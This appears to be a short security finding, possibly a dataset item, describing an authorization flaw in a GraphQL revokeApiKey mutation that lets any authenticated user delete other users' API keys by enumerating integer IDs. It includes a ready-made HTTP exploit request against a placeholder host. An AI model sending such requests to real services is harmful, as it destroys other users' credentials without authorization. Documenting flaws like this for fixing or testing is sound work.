diagnosis: The revoke_api_key mutation executes a direct deletion against ApiKey where id == key_id without verifying that the API key belongs to info.context['user'].id. Any authenticated user can revoke other users' API credentials by guessing or enumerating integer key IDs.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"query": "mutation { revokeApiKey(keyId: 981) { success } }"}
